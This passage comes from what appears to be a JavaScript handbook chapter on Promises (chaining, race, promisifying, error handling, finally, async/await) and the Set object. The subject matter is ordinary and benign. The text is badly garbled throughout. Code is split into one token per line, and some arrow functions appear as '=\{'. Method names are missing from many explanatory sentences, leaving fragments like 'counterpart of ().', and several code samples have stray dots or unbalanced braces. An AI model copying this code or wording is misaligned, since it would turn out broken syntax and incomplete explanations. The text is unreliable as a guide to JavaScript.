
(

2

,

6000

)

,

{

hello

:

3

}

&rbrack;

)

.

then

(

values

=&gt;

console.

log

(

values

)

)

;

*// outputs &quot;&lbrack;1, 2, { hello: 3 }&rbrack;&quot; after 6 seconds*

Destructuring assignment can help to retrieve results from multiple
promises.

Promise.

all

(

&lbrack;

resolve

(

1

,

5000

)

,

resolve

(

2

,

6000

)

,

resolve

(

3

,

7000

)

&rbrack;

)

.

then

(

(

&lbrack;

result1

,

result2

,

result3

&rbrack;

)

=&gt;

{

console.

log

(

result1

)

;

console.

log

(

result2

)

;

console.

log

(

result3

)

;

}

)

;

## Section 42.4: Reduce an array to chained promises

This design pattern is useful for generating a sequence of
asynchronous actions from a list of elements.
>
There are two variants :
>
the &quot;then&quot; reduction, which builds a chain that continues as long as
the chain experiences success.
>
the &quot;catch&quot; reduction, which builds a chain that continues as long
as the chain experiences error.
>
**The &quot;then&quot; reduction**

  -
  [then](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)
  -

  -

This variant of the pattern builds a
[.()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)
chain, and might be used for chaining animations, or making a sequence
of dependent HTTP requests.

&lbrack;

1

,

3

,

5

,

7

,

9

&rbrack;

.

reduce

(

(

seq

,

n

)

=&gt;

{

**return**

seq.

then

(

(

)

=&gt;

{

console.

log

(

n

)

;

**return**

**new**

Promise

(

res

=&gt;

setTimeout

(

res

,

1000

)

)

;

}

)

;

}

,

Promise.

resolve

(

)

)

.

then

(

(

)

=&gt;

console.

log

(

&apos;done&apos;

)

,

(

e

)

=&gt;

console.

log

(

e

)

)

;

*// will log 1, 3, 5, 7, 9, &apos;done&apos; in 1s intervals*

Explanation:

  
  [reduce](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce)   [()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce)   [Promise.resolve](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/resolve)
                                                                                                            on a source array, and provide                                                                        
   - 

  

1.  We call
    [.](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce)[()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/resolve)
    as an initial value.

  -
  [then](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)
  -

  -

2.  Every element reduced will add a
    [.()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)
    to the initial value.

  
  [reduce](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce)
  

  

3.[()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce)&apos;s
product will be Promise.resolve().then(&hellip;).then(&hellip;).

  
  [then](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)   [(](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)   [successHandler](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)   [,](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)   [errorHandler](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)
  -  -  -

  

4&period; We manually append a
[.)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)
after the reduce, to execute successHandler once all the previous
steps have resolved. If any step was to fail, then errorHandler would
execute.

  
  Promise.all
  

  

Note: The &quot;then&quot; reduction is a sequential counterpart of ().
>
**The &quot;catch&quot; reduction**

  
  [**catch**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch)
  

  

This variant of the pattern builds a
[.()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch)
chain and might be used for sequentially probing a set of web servers
for some mirrored resource until a working server is found.

**var**

working_resource

=

5

;

*// one of the values from the source array*

&lbrack;

1

,

3

,

5

,

7

,

9

&rbrack;

.

reduce

(

(

seq

,

n

)

=&gt;

{

**return**

seq.

**catch**

(

(

)

=&gt;

{

console.

log

(

n

)

;

**if**

(

n

===

working_resource

)

{

*// 5 is working*

**return**

**new**

Promise

(

(

resolve

,

reject

)

=&gt;

setTimeout

(

(

)

=&gt;

resolve

(

n

)

,

1000

)

)

;

}

**else**

{

*// all other values are not working*

**return**

**new**

Promise

(

(

resolve

,

reject

)

=&gt;

setTimeout

(

reject

,

1000

)

)

;

}

}

)

;

}

,

Promise.

reject

(

)

)

.

then

(

(

n

)

=&gt;

console.

log

(

&apos;success at: &apos;

&plus;

n

)

,

(

)

=&gt;

console.

log

(

&apos;total failure&apos;

)

)

;

*// will log 1, 3, 5, &apos;success at 5&apos; at 1s intervals*

Explanation:

  
  [reduce](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce)   [()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce)   [Promise.reject](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/reject)
                                                                                                            on a source array, and provide                                                                        
   - 

  

1.  We call
    [.](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce)[()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/reject)
    as an initial value.

  
  [**catch**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch)
  

  

2.  Every element reduced will add a
    [.()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch)
    to the initial value.

  
  [reduce](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce)   [()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce)&apos;s   Promise.reject   ().   **catch**   (   &hellip;   ).   **catch**   (   &hellip;
                                                                                                            product will be                                                                                                                                                             
    - -       

  

3.).

  
  [then](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)   [(](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)   [successHandler](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)   [,](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)   [errorHandler](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)
  -  -  -

  

4&period; We manually append
[.)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)
after the reduce, to execute successHandler once any of the previous
steps has resolved. If all steps were to fail, then errorHandler would
execute.

  
  Promise.any        () (as implemented in             bluebird.js
  -  -

  

Note: The &quot;catch&quot; reduction is a sequential counterpart of , but not
currently in native ECMAScript).

## Section 42.5: Waiting for the first of multiple concurrent promises

  -
  [Promise.race](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/race)
  -

  -

The
[()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/race)
static method accepts an iterable of Promises and returns a new
Promise which resolves or rejects as soon as the **first** of the
promises in the iterable has resolved or rejected.

*// wait &quot;milliseconds&quot; milliseconds, then resolve with &quot;value&quot;*

**function**

resolve

(

value

,

milliseconds

)

{

**return**

**new**

Promise

(

resolve

=&gt;

setTimeout

(

(

)

=&gt;

resolve

(

value

)

,

milliseconds

)

)

;

}

*// wait &quot;milliseconds&quot; milliseconds, then reject with &quot;reason&quot;*

**function**

reject

(

reason

,

milliseconds

)

{

**return**

**new**

Promise

(

(

&lowbar;

,

reject

)

=&gt;

setTimeout

(

(

)

=&gt;

reject

(

reason

)

,

milliseconds

)

)

;

}

Promise.

race

(

&lbrack;

resolve

(

1

,

5000

)

,

resolve

(

2

,

3000

)

,

resolve

(

3

,

1000

)

&rbrack;

)

.

then

(

value

=&gt;

console.

log

(

value

)

)

;

*// outputs &quot;3&quot; after 1 second.*

Promise.

race

(

&lbrack;

reject

(

**new**

Error

(

&apos;bad things!&apos;

)

,

1000

)

,

resolve

(

2

,

2000

)

&rbrack;

)

.

then

(

value

=&gt;

console.

log

(

value

)

)

*// does not output anything*

.

**catch**

(

error

=&gt;

console.

log

(

error.

message

)

)

;

*// outputs &quot;bad things!&quot; after 1 second*

## Section 42.6: &quot;Promisifying&quot; functions with callbacks

Given a function that accepts a Node-style callback,

fooFn

(

options

,

**function**

callback

(

err

,

result

)

{

&hellip;

}

)

;

you can promisify it *(convert it to a promise-based function)* like
this:

**function**

promiseFooFn

(

options

)

{

**return**

**new**

Promise

(

(

resolve

,

reject

)

=&gt;

fooFn

(

options

,

(

err

,

result

)

=&gt;

*// If there&apos;s an error, reject; otherwise resolve*

err

?

reject

(

err

)

:

resolve

(

result

)

)

)

;

}

This function can then be used as follows:

promiseFooFn

(

options

)

.

then

(

result

=&gt;

{

*// success!*

}

)

.

**catch**

(

err

=&gt;

{

*// error!*

}

)

;

In a more generic way, here&apos;s how to promisify any given
callback-style function:

**function**

promisify

(

func

)

{

**return**

**function**

(

&hellip;

args

)

{

**return**

**new**

Promise

(

(

resolve

,

reject

)

=&gt;

{

func

(

&hellip;

args

,

(

err

,

result

)

=&gt;

err

?

reject

(

err

)

:

resolve

(

result

)

)

;

}

)

;

}

}

This can be used like this:

**const**

fs

=

require

(

&apos;fs&apos;

)

;

**const**

promisedStat

=

promisify

(

fs.

stat

.

bind

(

fs

)

)

;

promisedStat

(

&apos;/foo/bar&apos;

)

.

then

(

stat

=&gt;

console.

log

(

&apos;STATE&apos;

,

stat

)

)

.

**catch**

(

err

=&gt;

console.

log

(

&apos;ERROR&apos;

,

err

)

)

;

## Section 42.7: Error Handling

Errors thrown from promises are handled by the second parameter
(reject) passed to then or by the handler passed to **catch**:

throwErrorAsync

(

)

.

then

(

**null**

,

error

=&gt;

{

*/&ast; handle error here &ast;/*

}

)

;

*// or*

throwErrorAsync

(

)

.

**catch**

(

error

=&gt;

{

*/&ast; handle error here &ast;/*

}

)

;

**Chaining**
>
If you have a promise chain then an error will cause resolve handlers
to be skipped:

throwErrorAsync

(

)

.

then

(

(

)

=&gt;

{

*/&ast; never called &ast;/*

}

)

.

**catch**

(

error

=&gt;

{

*/&ast; handle error here &ast;/*

}

)

;

The same applies to your then functions. If a resolve handler throws
an exception then the next reject handler will be invoked:

doSomethingAsync

(

)

.

then

(

result

=&gt;

{

throwErrorSync

(

)

;

}

)

.

then

(

(

)

=&gt;

{

*/&ast; never called &ast;/*

}

)

.

**catch**

(

error

=&gt;

{

*/&ast; handle error from throwErrorSync() &ast;/*

}

)

;

An error handler returns a new promise, allowing you to continue a
promise chain. The promise returned by the error handler is resolved
with the value returned by the handler:

throwErrorAsync

(

)

.

**catch**

(

error

=&gt;

{

*/&ast; handle error here &ast;/*

;

**return**

result

;

}

)

.

then

(

result

=&gt;

{

*/&ast; handle result here &ast;/*

}

)

;

You can let an error cascade down a promise chain by re-throwing the
error:

throwErrorAsync

(

)

.

**catch**

(

error

=&gt;

{

*/&ast; handle error from throwErrorAsync() &ast;/*

**throw**

error

;

}

)

.

then

(

(

)

=&gt;

{

*/&ast; will not be called if there&apos;s an error &ast;/*

}

)

.

**catch**

(

error

=&gt;

{

*/&ast; will get called with the same error &ast;/*

}

)

;

It is possible to throw an exception that is not handled by the
promise by wrapping the **throw** statement inside a setTimeout
callback:

**new**

Promise

(

(

resolve

,

reject

)

=&gt;

{

setTimeout

(

(

)

=&gt;

{

**throw**

**new**

Error

(

)

;

}

)

;

}

)

;

This works because promises cannot handle exceptions thrown
asynchronously. **Unhandled rejections**
>
An error will be silently ignored if a promise doesn&apos;t have a
**catch** block or reject handler:

throwErrorAsync

(

)

.

then

(

(

)

=&gt;

{

*/&ast; will not be called &ast;/*

}

)

;

*// error silently ignored*

To prevent this, always use a **catch** block:

throwErrorAsync

(

)

.

then

(

(

)

=&gt;

{

*/&ast; will not be called &ast;/*

}

)

.

**catch**

(

error

=&gt;

{

*/&ast; handle error&ast;/*

}

)

;

*// or*

throwErrorAsync

(

)

.

then

(

(

)

=&gt;

{

*/&ast; will not be called &ast;/*

}

,

error

=&gt;

{

*/&ast; handle error&ast;/*

}

)

;

Alternatively, subscribe to the
[unhandledrejection](https://developer.mozilla.org/en-US/docs/Web/Events/unhandledrejection)
event to catch any unhandled rejected promises:

window.

addEventListener

(

&apos;unhandledrejection&apos;

,

event

=&gt;

{

}

)

;

Some promises can handle their rejection later than their creation
time. The
[rejectionhandled](https://developer.mozilla.org/en-US/docs/Web/Events/rejectionhandled)
event gets fired whenever such a promise is handled:

window.

addEventListener

(

&apos;unhandledrejection&apos;

,

event

=&gt;

console.

log

(

&apos;unhandled&apos;

)

)

;

window.

addEventListener

(

&apos;rejectionhandled&apos;

,

event

=&gt;

console.

log

(

&apos;handled&apos;

)

)

;

**var**

p

=

Promise.

reject

(

&apos;test&apos;

)

;

setTimeout

(

(

)

=&gt;

p&period;

**catch**

(

console.

log

)

,

1000

)

;

*// Will print &apos;unhandled&apos;, and after one second &apos;test&apos; and
&apos;handled&apos;*

  
  event.reason       is the error object and         event.promise
  -  

  

The event argument contains information about the rejection. is the
promise object that caused the event.
>
In Nodejs the rejectionhandled and unhandledrejection events are
called
[rejectionHandled](https://nodejs.org/api/process.html#process_event_rejectionhandled)
and
[unhandledRejection](https://nodejs.org/api/process.html#process_event_unhandledrejection)
on process, respectively, and have a different signature:
>
process.on(&apos;rejectionHandled&apos;, (reason, promise) =&bsol;{});
process.on(&apos;unhandledRejection&apos;, (reason, promise) =&bsol;{});
>
The reason argument is the error object and the promise argument is a
reference to the promise object that caused the event to fire.
>
Usage of these unhandledrejection and rejectionhandled events should
be considered for debugging purposes only. Typically, all promises
should handle their rejections.
>
**Note:** Currently, only Chrome 49+ and Node.js support
unhandledrejection and rejectionhandled events.
>
**Caveats**
>
**Chaining with fulfill and reject**

  -
  then           (   fulfill                  ,   reject
    -  -

  -

The ) function (with both parameters not **null**) has unique and
complex behavior, and shouldn&apos;t be used unless you know exactly how
it works.
>
The function works as expected if given **null** for one of the
inputs:

*// the following calls are equivalent*

promise.

then

(

fulfill

,

**null**

)

promise.

then

(

fulfill

)

*// the following calls are also equivalent*

promise.

then

(

**null**

,

reject

)

promise.

**catch**

(

reject

)

However, it adopts unique behavior when both inputs are given:

*// the following calls are not equivalent!*

promise.

then

(

fulfill

,

reject

)

promise.

then

(

fulfill

)

.

**catch**

(

reject

)

*// the following calls are not equivalent!*

promise.

then

(

fulfill

,

reject

)

promise.

**catch**

(

reject

)

.

then

(

fulfill

)

  
  then   (   fulfill   ,   reject   ) function looks like it is a then   (   fulfill   ).   **catch**   (   reject
                                    shortcut for                                                            
              

  

The ), but it is not, and
>
will cause problems if used interchangeably. One such problem is that
the reject handler does not handle errors from the fulfill handler.
Here is what will happen:
>
Promise.resolve() *// previous promise is fulfilled*
>
.then(() =&bsol;{ **throw** **new** Error(); }, *// error in the fulfill
handler* error =&bsol;{ */&ast; this is not called! &ast;/* });
>
The above code will result in a rejected promise because the error is
propagated. Compare it to the following code, which results in a
fulfilled promise:
>
Promise.resolve() *// previous promise is fulfilled*
>
.then(() =&bsol;{ **throw** **new** Error(); }) *// error in the fulfill
handler*
>
.**catch**(error =&bsol;{ */&ast; handle error &ast;/* });

  
  then   (   fulfill   ,   reject   ) interchangeably     **catch**   (   reject   ).   then   (   fulfill
                                    with                                                           
              

  

A similar problem exists when using ), except with propagating
fulfilled promises instead of rejected promises. **Synchronously
throwing from function that should return a promise** Imagine a
function like this:

**function**

foo

(

arg

)

{

**if**

(

arg

===

&apos;unexepectedValue&apos;

)

{

**throw**

**new**

Error

(

&apos;UnexpectedValue&apos;

)

}

**return**

**new**

Promise

(

resolve

=&gt;

setTimeout

(

(

)

=&gt;

resolve

(

arg

)

,

1000

)

)

}

If such function is used in the **middle** of a promise chain, then
apparently there is no problem:

makeSomethingAsync

(

)

.

.

then

(

(

)

=&gt;

foo

(

&apos;unexpectedValue&apos;

)

)

.

**catch**

(

err

=&gt;

console.

log

(

err

)

)

*// &lt;&bsol; Error: UnexpectedValue will be caught here*

However, if the same function is called outside of a promise chain,
then the error will not be handled by it and will be thrown to the
application:
>
foo(&apos;unexpectedValue&apos;) *// &lt;&bsol; error will be thrown, so the
application will crash*
>
.then(makeSomethingAsync) *// &lt;&bsol; will not run*
>
.**catch**(err =&bsol;console.log(err)) *// &lt;&bsol; will not catch*
>
There are 2 possible workarounds:
>
**Return a rejected promise with the error**
>
Instead of throwing, do as follows:

**function**

foo

(

arg

)

{

**if**

(

arg

===

&apos;unexepectedValue&apos;

)

{

**return**

Promise.

reject

(

**new**

Error

(

&apos;UnexpectedValue&apos;

)

)

}

**return**

**new**

Promise

(

resolve

=&gt;

setTimeout

(

(

)

=&gt;

resolve

(

arg

)

,

1000

)

)

}

**Wrap your function into a promise chain**
>
Your **throw** statement will be properly caught when it is already
inside a promise chain:

**function**

foo

(

arg

)

{

**return**

Promise.

resolve

(

)

.

then

(

(

)

=&gt;

{

**if**

(

arg

===

&apos;unexepectedValue&apos;

)

{

**throw**

**new**

Error

(

&apos;UnexpectedValue&apos;

)

}

**return**

**new**

Promise

(

resolve

=&gt;

setTimeout

(

(

)

=&gt;

resolve

(

arg

)

,

1000

)

)

}

)

}

## Section 42.8: Reconciling synchronous and asynchronous operations

In some cases you may want to wrap a synchronous operation inside a
promise to prevent repetition in code branches. Take this example:

**if**

(

result

)

{

*// if we already have a result*

processResult

(

result

)

;

*// process it*

}

**else**

{

fetchResult

(

)

.

then

(

processResult

)

;

}

The synchronous and asynchronous branches of the above code can be
reconciled by redundantly wrapping the synchronous operation inside a
promise:

**var**

fetch

=

result

?

Promise.

resolve

(

result

)

:

fetchResult

(

)

;

fetch.

then

(

processResult

)

;

When caching the result of an asynchronous call, it is preferable to
cache the promise rather than the result itself. This ensures that
only one asynchronous operation is required to resolve multiple
parallel requests.
>
Care should be taken to invalidate cached values when error conditions
are encountered.

*// A resource that is not expected to change frequently*

**var**

planets

=

&apos;http://swapi.co/api/planets/&apos;

;

*// The cached promise, or null*

**var**

cachedPromise

;

**function**

fetchResult

(

)

{

**if**

(

!

cachedPromise

)

{

cachedPromise

=

fetch

(

planets

)

.

**catch**

(

**function**

(

e

)

{

*// Invalidate the current result to retry on the next fetch*

cachedPromise

=

**null**

;

*// re-raise the error to propagate it to callers*

**throw**

e

;

}

)

;

}

**return**

cachedPromise

;

}

## Section 42.9: Delay function call

  
  [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowTimers/setTimeout)
  

  

The
[()](https://developer.mozilla.org/en-US/docs/Web/API/WindowTimers/setTimeout)
method calls a function or evaluates an expression after a specified
number of milliseconds. It is also a trivial way to achieve an
asynchronous operation.
>
In this example calling the wait function resolves the promise after
the time specified as first argument:

**function**

wait

(

ms

)

{

**return**

**new**

Promise

(

resolve

=&gt;

setTimeout

(

resolve

,

ms

)

)

;

}

wait

(

5000

)

.

then

(

(

)

=&gt;

{

console.

log

(

&apos;5 seconds have passed&hellip;&apos;

)

;

}

)

;

## Section 42.10: &quot;Promisifying&quot; values

  
  [Promise.resolve](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/resolve)
  

  

The static method can be used to wrap values into promises.

**let**

resolved

=

Promise.

resolve

(

2

)

;

resolved.

then

(

value

=&gt;

{

*// immediately invoked*

*// value === 2*

}

)

;

  
  [Promise.resolve](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/resolve)
  

  

If value is already a promise, simply recasts it.

**let**

one

=

**new**

Promise

(

resolve

=&gt;

setTimeout

(

(

)

=&gt;

resolve

(

2

)

,

1000

)

)

;

**let**

two

=

Promise.

resolve

(

one

)

;

two.

then

(

value

=&gt;

{

*// 1 second has passed*

*// value === 2*

}

)

;

  
  [Promise.resolve](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/resolve)
  

  

In fact, value can be any &quot;thenable&quot; (object defining a then method
that works sufficiently like a spec-compliant promise). This allows to
convert untrusted 3rd-party objects into trusted 1st-party Promises.

**let**

resolved

=

Promise.

resolve

(

{

then

(

onResolved

)

{

onResolved

(

2

)

;

}

}

)

;

resolved.

then

(

value

=&gt;

{

*// immediately invoked*

*// value === 2*

}

)

;

  
  [Promise.reject](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/reject)
  

  

The static method returns a promise which immediately rejects with the
given reason.

**let**

rejected

=

Promise.

reject

(

&quot;Oops!&quot;

)

;

rejected.

**catch**

(

reason

=&gt;

{

*// immediately invoked*

*// reason === &quot;Oops!&quot;*

}

)

;

## Section 42.11: Using ES2017 async/await

  
  **try**                 /       **catch**
   - 

  

The same example above, Image loading, can be written using async
functions. This also allows using the common method for exception
handling.
>
Note: [as of April 2017, the current releases of all browsers but
Internet Explorer supports async
functions](http://caniuse.com/#feat=async-functions).

**function**

loadImage

(

url

)

{

**return**

**new**

Promise

(

(

resolve

,

reject

)

=&gt;

{

**const**

img

=

**new**

Image

(

)

;

img.

addEventListener

(

&apos;load&apos;

,

(

)

=&gt;

resolve

(

img

)

)

;

img.

addEventListener

(

&apos;error&apos;

,

(

)

=&gt;

{

reject

(

**new**

Error

(

&grave;Failed to load &dollar;

{

url

}

&grave;

)

)

;

}

)

;

img.

src

=

url

;

}

)

;

}

(

async

(

)

=&gt;

{

*// load /image.png and append to #image-holder, otherwise throw error*

**try**

{

**let**

img

=

await loadImage

(

&apos;http://example.com/image.png&apos;

)

;

document.

getElementById

(

&apos;image-holder&apos;

)

.

appendChild

(

img

)

;

}

**catch**

(

error

)

{

console.

error

(

error

)

;

}

}

)

(

)

;

## Section 42.12: Performing cleanup with finally()

There is currently a
[proposal](https://github.com/tc39/proposal-promise-finally) (not yet
part of the ECMAScript standard) to add a **finally** callback to
promises that will be executed regardless of whether the promise is
fulfilled or rejected. Semantically, this is similar to the
[**finally** clause of the **try**
block](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/try...catch#The_finally_clause).
>
You would usually use this functionality for cleanup:

**var**

loadingData

=

**true**

;

fetch

(

&apos;/data&apos;

)

.

then

(

result

=&gt;

processData

(

result.

data

)

)

.

**catch**

(

error

=&gt;

console.

error

(

error

)

)

.

**finally**

(

(

)

=&gt;

{

loadingData

=

**false**

;

}

)

;

It is important to note that the **finally** callback doesn&apos;t affect
the state of the promise. It doesn&apos;t matter what value it returns,
the promise stays in the fulfilled/rejected state that it had before.
So in the example above the promise

  
  processData                       (   result.data
    

  

will be resolved with the return value of ) even though the
**finally** callback returned **undefined**.
>
With the standardization process still being in progress, your
promises implementation most likely won&apos;t support **finally**
callbacks out of the box. For synchronous callbacks you can add this
functionality with a polyfill however:

**if**

(

!

Promise.

**prototype**

.

**finally**

)

{

Promise.

**prototype**

.

**finally**

=

**function**

(

callback

)

{

**return**

**this**

.

then

(

result

=&gt;

{

callback

(

)

;

**return**

result

;

}

,

error

=&gt;

{

callback

(

)

;

**throw**

error

;

}

)

;

}

;

}

## Section 42.13: forEach with promises

It is possible to effectively apply a function (cb) which returns a
promise to each element of an array, with each element waiting to be
processed until the previous element is processed.

**function**

promiseForEach

(

arr

,

cb

)

{

**var**

i

=

0

;

**var**

nextPromise

=

**function**

(

)

{

**if**

(

i

&gt;=

arr.

length

)

{

*// Processing finished.*

**return**

;

}

*// Process next function. Wrap in &grave;Promise.resolve&grave; in case*

*// the function does not return a promise*

**var**

newPromise

=

Promise.

resolve

(

cb

(

arr

&lbrack;

i

&rbrack;

,

i

)

)

;

i

++

;

*// Chain to finish processing.*

**return**

newPromise.

then

(

nextPromise

)

;

}

;

*// Kick off the chain.*

**return**

Promise.

resolve

(

)

.

then

(

nextPromise

)

;

}

;

This can be helpful if you need to efficiently process thousands of
items, one at a time. Using a regular **for** loop to create the
promises will create them all at once and take up a significant amount
of RAM.

## Section 42.14: Asynchronous API request

This is an example of a simple GET API call wrapped in a promise to
take advantage of its asynchronous functionality.

**var**

**get**

=

**function**

(

path

)

{

**return**

**new**

Promise

(

**function**

(

resolve

,

reject

)

{

**let**

request

=

**new**

XMLHttpRequest

(

)

;

request.

open

(

&apos;GET&apos;

,

path

)

;

request.

onload

=

resolve

;

request.

onerror

=

reject

;

request.

send

(

)

;

}

)

;

}

;

More robust error handling can be done using the following
[onload](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequestEventTarget/onload)
and
[onerror](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequestEventTarget/onerror)
functions.

request.

onload

=

**function**

(

)

{

**if**

(

**this**

.

status

&gt;=

200

&&

**this**

.

status

&lt;

300

)

{

**if**

(

request.

response

)

{

*// Assuming a successful call returns JSON*

resolve

(

JSON.

parse

(

request.

response

)

)

;

}

**else**

{

resolve

(

)

;

}

**else**

{

reject

(

{

&apos;status&apos;

:

**this**

.

status

,

&apos;message&apos;

:

request.

statusText

}

)

;

}

}

;

request.

onerror

=

**function**

(

)

{

reject

(

{

&apos;status&apos;

:

**this**

.

status

,

&apos;message&apos;

:

request.

statusText

}

)

;

}

;

# Chapter 43: Set

**Parameter Details**

If an iterable object is passed, all of its elements will be added to
the new Set. null is treated as iterable undefined.
>
value The value of the element to add to the Set object. callback
Function to execute for each element. thisArg Optional. Value to use
as this when executing callback.
>
The Set object lets you store unique values of any type, whether
primitive values or object references.
>
Set objects are collections of values. You can iterate through the
elements of a set in insertion order. A value in the Set may only
occur **ONCE**; it is unique in the Set&apos;s collection. Distinct values
are discriminated using the *SameValueZero* comparison algorithm.
>
[Standard Specification About
Set](http://www.ecma-international.org/ecma-262/6.0/#sec-set-objects)

## Section 43.1: Creating a Set

The Set object lets you store unique values of any type, whether
primitive values or object references.
>
You can push items into a set and iterate them similar to a plain
JavaScript array, but unlike array, you cannot add a value to a Set if
the value already exist in it.
>
To create a new set:

**const**

mySet

=

**new**

Set

(

)

;

Or you can create a set from any iterable object to give it starting
values:

**const**

arr

=

&lbrack;

1

,

2

,

3

,

4

,

4

,

5

&rbrack;

;

**const**

mySet

=

**new**

Set

(

arr

)

;

In the example above the set content would be

{

1

,

2

,

3

,

4

,

5

}

. Note that the value 4 appears only once, unlike in

the original array used to create it.

## Section 43.2: Adding a value to a Set

  
  add
  

  

To add a value to a Set, use the .() method:

mySet.

add

(

5

)

;

If the value already exist in the set it will not be added again, as
Sets contain unique values.

  
  add
  

  

Note that the .() method returns the set itself, so you can chain add
calls together:

mySet.

add

(

1

)

.

add

(

2

)

.

add

(

3

)

;

## Section 43.3: Removing value from a set

  
  **delete**
  

  

To remove a value from a set, use .() method:

mySet.

**delete**

(

some_val

)

;

This function will return **true** if the value existed in the set and
was removed, or **false** otherwise.

## Section 43.4: Checking if a value exist in a set

  
  has
  

  

To check if a given value exists in a set, use .() method:

mySet.

has

(

someVal

)

;

Will return **true** if someVal appears in the set, **false**
otherwise.

## Section 43.5: Clearing a Set

  
  clear
  

  

You can remove all the elements in a set using the .() method:

mySet.

clear

(

)

;

## Section 43.6: Getting set length

  
  size
  

  

You can get the number of elements inside the set using the . property

**const**

mySet

=

**new**

Set

(

&lbrack;

1

,

2

,

2

,

3

&rbrack;

)

;

mySet.

add

(

4

)

;

mySet.

size

;

*// 4*

  
  Array            .   **prototype**                 .   length
  -    

  

This property, unlike , is read-only, which means that you can&apos;t
change it by assigning something to it:

mySet.

size

=

5

;

mySet.

size

;

*// 4*

In strict mode it even throws an error:
>
TypeError: Cannot **set** property size of #&lt;Set&bsol;which has only a
getter

## Section 43.7: Converting Sets to arrays

  
  Array                   .    **prototype**
    -

  

Sometimes you may need to convert a Set to an array, for example to be
able to use methods like

  
  filter   (). In order to do so,  Array   .   from   () or destructuring   &minus;   assignment
           use                                                                   
    -   -   

  

.:

**var**

mySet

=

**new**

Set

(

&lbrack;

1

,

2

,

3

,

4

&rbrack;

)

;

*//use Array.from*

**const**

myArray

=

Array

.

from

(

mySet

)

;

*//use destructuring-assignment*

**const**

myArray

=

&lbrack;

&hellip;

mySet

&rbrack;

;

Now you can filter the array to contain only even numbers and convert
it back to Set using Set constructor:

mySet

=

**new**

Set

(

myArray.

filter

(

x

=&gt;

x

&percnt;

2

===

0

)

)

;

mySet now contains only even numbers:

console.

log

(

mySet

)

;

*// Set {2, 4}*

## Section 43.8: Intersection and dierence in Sets

There are no build-in methods for intersection and difference in Sets,
but you can still achieve that but converting them to arrays,
filtering, and converting back to Sets:
>
**var** set1 = **new** Set(&lbrack;1, 2, 3, 4&rbrack;), set2 = **new** Set(&lbrack;3, 4,
5, 6&rbrack;);
>
**const** intersection = **new** Set(Array.from(set1).filter(x =&gt;
set2.has(x)));*//Set {3, 4}* **const** difference = **new**
Set(Array.from(set1).filter(x =&bsol;!set2.has(x))); *//Set {1, 2}*

## Section 43.9: Iterating Sets

You can use a simple for-of loop to iterate a Set:

**const**

mySet

=

**new**

Set

(

&lbrack;

1

,

2

,

3

&rbrack;

)

;

**for**

(

**const**

value of mySet

)

{

console.

log

(

value

)

;

*// logs 1, 2 and 3*

}

When iterating over a set, it will always return values in the order
they were first added to the set. For example:

**const**

**set**

=

**new**

Set

(

&lbrack;

4

,

5

,

6

&rbrack;

)

**set**

.

add

(

10

)

**set**

.

add

(

5

)

*//5 already exists in the set*

Array

.

from

(

**set**

)

*//&lbrack;4, 5, 6, 10&rbrack;*

  -
